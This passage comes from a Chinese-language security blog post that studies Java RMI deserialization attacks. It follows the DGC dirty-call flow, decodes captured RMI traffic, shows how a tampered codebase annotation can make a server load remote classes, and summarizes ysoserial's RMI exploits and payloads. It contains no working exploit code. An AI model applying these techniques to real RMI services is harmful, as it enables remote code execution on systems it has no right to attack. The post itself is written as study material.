<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0223b7a85.png" alt="image-20240520175856620"></p>
<p>在UnicastRef的反序列化流程里面他会调用readExternal</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0222dff5f.png" alt="image-20240520180003366"></p>
<p>然后就是saveRef</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f02271e6af.png" alt="image-20240520180056890"></p>
<p>然后就会把incommingRefTable赋值 这样就不为空了</p>
<p>此时内存里面的那个表就已经有值了</p>
<p>接下来就正常走反序列化流程</p>
<p>到releaseInputStream</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f021ed9f9a.png" alt="image-20240520180540799"></p>
<p>接着就会往下走</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0220a4061.png" alt="image-20240520180609270"></p>
<p>这个表就不为空了</p>
<p>这样我们的攻击就会在正常的反序列化中进行</p>
<p>到这里：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0228de286.png" alt="image-20240520180731618"></p>
<p>但这里我们只做了赋值还没有进行请求</p>
<p>注意后面的NewThreadAction</p>
<p>这是在调自己里面的线程</p>
<p>这个线程是什么呢</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0225b43fc.png" alt="image-20240520181039580"></p>
<p>它其实最后是调了一个makeDirtyCall</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f021d9bbeb.png" alt="image-20240520181134615"></p>
<p>它其实就是调了DGC</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0227bd343.png" alt="image-20240520181214323"></p>
<h4 id="java-lang-reflect-Proxy-class"><a href="#java-lang-reflect-Proxy-class" class="headerlink" title="java.lang.reflect.Proxy.class"></a>java.lang.reflect.Proxy.class</h4><p>这个很少在用</p>
<p>还记得我前面用的那个低于7u21、6u45的利用吗</p>
<p>那个是用codebase来加载远程类，在RMI服务端执行任意代码</p>
<p>这里我们从原理上阐述一下</p>
<p>我们用wireshark来抓一下那个包</p>
<p>当然也有2个TCP连接</p>
<ol>
<li><p>本机与RMI Registry的通信（在我的数据包中是1099端口）</p>
</li>
<li><p>本机与RMI Server的通信（在我的数据包中是64000端口）</p>
</li>
</ol>
<p>我们用 <code>tcp.stream eq 0</code> 来筛选出本机与RMI Registry的数据流：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f021e91841.png" alt="image-20240520201839538"></p>
<p>可见，在与RMI Registry通信的时候Wireshark识别出了协议类型。我们选择其中序号是8的数据包，然</p>
<p>后复制Wireshark识别出的 Java Serialization 数据段：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f022a33464.png" alt="image-20240520201940308"></p>
<p>这段数据由0xACED开头，这是一段java序列化数据</p>
<p>我们可以使用SerializationDumper对Java序列化数据进行分析：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f021f2e910.png" alt="image-20240520202044280"></p>
<p>SerializationDumper输出了很多预定义常量，像 TC_BLOCKDATA 这种，它究竟表示什么意思呢？此时</p>
<p>我们还得借助Java序列化的协议<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">文档</a></p>
<p>这篇文档里用了一种类似BNF（巴科斯范式）的形式描述了序列化数据的语法，比如我们这里的这段简单的数据，其涉及到如下语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stream:</span><br><span class="line"> magic version contents</span><br><span class="line"></span><br><span class="line">contents:</span><br><span class="line"> content</span><br><span class="line"> contents content</span><br><span class="line"></span><br><span class="line">content:</span><br><span class="line"> object</span><br><span class="line"> blockdata</span><br><span class="line"></span><br><span class="line">object:</span><br><span class="line"> newObject</span><br><span class="line"> newClass</span><br><span class="line"> newArray</span><br><span class="line"> newString</span><br><span class="line"> newEnum</span><br><span class="line"> newClassDesc</span><br><span class="line"> prevObject</span><br><span class="line"> nullReference</span><br><span class="line"> exception</span><br><span class="line"> TC_RESET</span><br><span class="line"></span><br><span class="line">blockdata:</span><br><span class="line"> blockdatashort</span><br><span class="line"> blockdatalong</span><br><span class="line"></span><br><span class="line">blockdatashort:</span><br><span class="line"> TC_BLOCKDATA (unsigned byte)&lt;size&gt; (byte)[size]</span><br><span class="line"></span><br><span class="line">newString:</span><br><span class="line"> TC_STRING newHandle (utf)</span><br><span class="line"> TC_LONGSTRING newHandle (long-utf)</span><br></pre></td></tr></table></figure>

<p>其中 TC_BLOCKDATA 这部分对应的是 contents -&gt; content -&gt; blockdata -&gt; blockdatashort ，TC_STRING 这部分对应的是 contents -&gt; content -&gt; object-&gt; newString 。都可以在文档里找到完整的语法定义。</p>
<p>这一整个序列化对象，其实描述的就是一个字符串，其值是 refObj 。意思是获取远程的 refObj 对象。</p>
<p>接着我们在序号为10的数据包中获取到了这个对象：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">TC_BLOCKDATA - 0x77</span><br><span class="line">Length - 15 - 0x0f</span><br><span class="line">Contents - 0x01a4462ec50000016d8d8d63578008</span><br><span class="line">TC_OBJECT - 0x73</span><br><span class="line">TC_PROXYCLASSDESC - 0x7d</span><br><span class="line">newHandle 0x00 7e 00 00</span><br><span class="line">Interface count - 2 - 0x00 00 00 02</span><br><span class="line">proxyInterfaceNames</span><br><span class="line">0:</span><br><span class="line">Length - 15 - 0x00 0f</span><br><span class="line">Value - java.rmi.Remote - 0x6a6176612e726d692e52656d6f7465</span><br><span class="line">1:</span><br><span class="line">Length - 5 - 0x00 05</span><br><span class="line">Value - ICalc - 0x4943616c63</span><br><span class="line">classAnnotations</span><br><span class="line">TC_NULL - 0x70</span><br><span class="line">TC_ENDBLOCKDATA - 0x78</span><br><span class="line">superClassDesc</span><br><span class="line">TC_CLASSDESC - 0x72</span><br><span class="line">className</span><br><span class="line">Length - 23 - 0x00 17</span><br><span class="line">Value - java.lang.reflect.Proxy -</span><br><span class="line">0x6a6176612e6c616e672e7265666c6563742e50726f7879</span><br><span class="line">serialVersionUID - 0xe1 27 da 20 cc 10 43 cb</span><br><span class="line">newHandle 0x00 7e 00 01</span><br><span class="line">classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">fieldCount - 1 - 0x00 01</span><br><span class="line">Fields</span><br><span class="line">0:</span><br><span class="line">Object - L - 0x4c</span><br><span class="line">fieldName</span><br><span class="line">Length - 1 - 0x00 01</span><br><span class="line">Value - h - 0x68</span><br><span class="line">className1</span><br><span class="line">TC_STRING - 0x74</span><br><span class="line">newHandle 0x00 7e 00 02</span><br><span class="line">Length - 37 - 0x00 25</span><br><span class="line">Value - Ljava/lang/reflect/InvocationHandler; -</span><br><span class="line">0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723</span><br><span class="line">b</span><br><span class="line">classAnnotations</span><br><span class="line">TC_NULL - 0x70</span><br><span class="line">TC_ENDBLOCKDATA - 0x78</span><br><span class="line">superClassDesc</span><br><span class="line">TC_NULL - 0x70</span><br><span class="line">newHandle 0x00 7e 00 03</span><br><span class="line">classdata</span><br><span class="line">java.lang.reflect.Proxy</span><br><span class="line">values</span><br><span class="line">h</span><br><span class="line">(object)</span><br><span class="line">TC_OBJECT - 0x73</span><br><span class="line">TC_CLASSDESC - 0x72</span><br><span class="line">className</span><br><span class="line">Length - 45 - 0x00 2d</span><br><span class="line">Value - java.rmi.server.RemoteObjectInvocationHandler -</span><br><span class="line">0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696</span><br><span class="line">f6e48616e646c6572</span><br><span class="line">serialVersionUID - 0x00 00 00 00 00 00 00 02</span><br><span class="line">newHandle 0x00 7e 00 04</span><br><span class="line">classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">fieldCount - 0 - 0x00 00</span><br><span class="line">classAnnotations</span><br><span class="line">TC_NULL - 0x70</span><br><span class="line">TC_ENDBLOCKDATA - 0x78</span><br><span class="line">superClassDesc</span><br><span class="line">TC_CLASSDESC - 0x72</span><br><span class="line">className</span><br><span class="line">Length - 28 - 0x00 1c</span><br><span class="line">Value - java.rmi.server.RemoteObject -</span><br><span class="line">0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374</span><br><span class="line">serialVersionUID - 0xd3 61 b4 91 0c 61 33 1e</span><br><span class="line">newHandle 0x00 7e 00 05</span><br><span class="line">classDescFlags - 0x03 - SC_WRITE_METHOD |</span><br><span class="line">SC_SERIALIZABLE</span><br><span class="line">fieldCount - 0 - 0x00 00</span><br><span class="line">classAnnotations</span><br><span class="line">TC_NULL - 0x70</span><br><span class="line">TC_ENDBLOCKDATA - 0x78</span><br><span class="line">superClassDesc</span><br><span class="line">TC_NULL - 0x70</span><br><span class="line">newHandle 0x00 7e 00 06</span><br><span class="line">classdata</span><br><span class="line">java.rmi.server.RemoteObject</span><br><span class="line">values</span><br><span class="line">objectAnnotation</span><br><span class="line">TC_BLOCKDATA - 0x77</span><br><span class="line">Length - 55 - 0x37</span><br><span class="line">Contents -</span><br><span class="line">0x000a556e6963617374526566000e3134302e3233382e33342e3231360000fa00276c05080</span><br><span class="line">63e8d45a4462ec50000016d8d8d6357800101</span><br><span class="line">TC_ENDBLOCKDATA - 0x78</span><br><span class="line">java.rmi.server.RemoteObjectInvocationHandler</span><br><span class="line">values</span><br></pre></td></tr></table></figure>

<p>这是一个 java.lang.reflect.Proxy 对象，其中有一段数据储存在 objectAnnotation 中:0x000a556e6963617374526566000e3134302e3233382e33342e3231360000fa00276c0508063e8d45a4462ec50000016d8d8d6357800101 ，记录了RMI Server的地址和端口。</p>
<p>在拿到RMI Server的地址和端口后，本机就会去连接并正式开始调用远程方法。我们再用 <code>tcp.streameq 1 </code>筛选出本机与RMI Server的数据流</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0228de286.png" alt="image-20240520202603143"></p>
<p>可见，wireshark没有再识别出RMI的协议。我们选择序号为19的数据包，其内容是 50 ac ed 开头，50是指 <a target="_blank" rel="noopener" href="https://github.com/JetBrains/jdk8u_jdk/blob/master/src/share/classes/sun/rmi/transport/TransportConstants.java#L47">RMI Call </a>， ac ed 当然是Java序列化数据。</p>
<p>我们使用SerializationDumper查看这段序列化数据：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f022ab149e.png" alt="image-20240520202731991"></p>
<p>可见，我们的 codebase 是通过 [Ljava.rmi.server.ObjID; 的 classAnnotations 传递的。</p>
<p>所以，即使我们没有RMI的客户端，只需要修改 classAnnotations 的值，就能控制codebase，使其指向攻击者的恶意网站。</p>
<h4 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h4><p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial">工具</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f02257a4b6.png" alt="image-20240520204117334"></p>
<p>exploit里是直接可以攻击的</p>
<p>payloads里是需要一些工具来的</p>
<h5 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h5><p>有三个：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f022368bf6.png" alt="image-20240520204413998"></p>
<p>RMIRegistryExploit.java：</p>
<p>低版本的直接攻击注册中心的</p>
<p>JRMPClient.java：</p>
<p>低版本攻击DGC服务</p>
<p>JRMPListener.java:</p>
<p>服务端发客户端请求  攻击普通的RMI也行</p>
<h5 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h5><p>里面有两个：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0229786dc.png" alt="image-20240520205039866"></p>
<p>JRMPListener.java：<br>用的很少</p>
<p>在一个已有反序列化的点里，传进去后会暴露出一个RMI的接口出来 </p>
<p>也就是将一个普通的反序列化点转换成一个RMI的反序列化点  相当于二次反序列化 可能会绕过一些过滤</p>
<p>JRMPClient.java：</p>
<p>这个就很常见了</p>
<p>是整个rmi分析里面最重要的一个链子</p>
<p>前面的都是在针对rmi来打的 也就是针对rmi服务</p>
<p>但如果没看rmi服务呢 可以通过上面那个给他开一个</p>
<p>也可以是用这个 不用开rmi也能打 利用条件还比上一个宽 也相当于一个二次反序列化（可以打非rmi的利用链）</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">VVkladg0r</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://cszvvds.cc/2024/05/23/java-RMI/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://cszvvds.cc/2024/05/23/java-RMI/')">java-RMI</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacae5439.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://cszvvds.cc/2024/05/23/java-RMI/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=java-RMI&amp;url=http://cszvvds.cc/2024/05/23/java-RMI/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://cszvvds.cc" target="_blank">VV</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/java%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>java安全<span class="tagsPageCount">13</span></a><a class="post-meta__box__tags" href="/tags/java/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>java<span class="tagsPageCount">13</span></a><a class="post-meta__box__tags" href="/tags/%E5%AD%A6%E4%B9%A0/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>学习<span class="tagsPageCount">26</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/23/H&amp;NCTF-wp/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">h_nCTF-wp</div></div></a></div><div class="next-post pull-right"><a href="/2024/05/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%8D%E7%BD%AE/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">java反序列化前置</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/06/07/JAVA%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/" title="JAVA加载字节码"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">JAVA加载字节码</div></div></a></div><div><a href="/2024/05/15/java%E5%8F%8D%E5%B0%84/" title="java反射"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-15</div><div class="title">java反射</div></div></a></div><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1/" title="java反序列化--CC1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC1</div></div></a></div><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2/" title="java反序列化--CC2"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC2</div></div></a></div><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4/" title="java反序列化--CC4"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC4</div></div></a></div><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6/" title="java反序列化--CC6"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC6</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2021/03/03/e511960ac5488.png" alt="status"/></div></div><div class="author-info__description">生活明朗 万物可爱</div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">大家好 我是VV 欢迎来看我的博客鸭~  希望你可以从中学习到一些知识</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JAVA-RMI"><span class="toc-number">1.</span> <span class="toc-text">JAVA - RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">RMI基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E6%88%90"><span class="toc-number">1.1.2.</span> <span class="toc-text">组成</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%9A-Client-%E4%B8%8A%E5%9B%BE%E5%8F%B3%E8%BE%B9%E9%83%A8%E5%88%86"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">客户端：(Client  上图右边部分)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%AE%B5%EF%BC%9A%EF%BC%88Server-%E4%B8%8A%E5%9B%BE%E4%B8%AD%E9%97%B4%E9%83%A8%E5%88%86%EF%BC%89"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">服务段：（Server 上图中间部分）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%EF%BC%88Registry-%E4%B8%8A%E5%9B%BE%E7%9A%84%E5%B7%A6%E4%BE%A7%E9%83%A8%E5%88%86%EF%BC%89"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">注册表（Registry 上图的左侧部分）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">通信流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">服务端：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">客户端：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">结果：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.2.4.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 